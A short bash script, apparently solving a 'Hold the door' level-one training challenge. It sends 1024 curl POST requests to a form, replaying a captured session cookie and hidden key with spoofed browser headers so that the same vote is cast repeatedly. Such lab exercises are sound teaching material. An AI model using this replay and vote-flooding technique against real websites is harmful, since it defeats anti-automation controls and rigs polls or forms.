#!/bin/bash
for i in `seq 1 1024`
do
  curl 'http://173.246.108.142/level1.php' -H 'Cookie: HoldTheDoor=b0269bebbafdec4d186f37331353e1245983dcd7' -H 'Origin: http://173.246.108.142' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/50.0.2661.102 Chrome/50.0.2661.102 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Referer: http://173.246.108.142/level1.php' -H 'Connection: keep-alive' --data 'id=1&holdthedoor=Submit&key=b0269bebbafdec4d186f37331353e1245983dcd7' --compressed
done
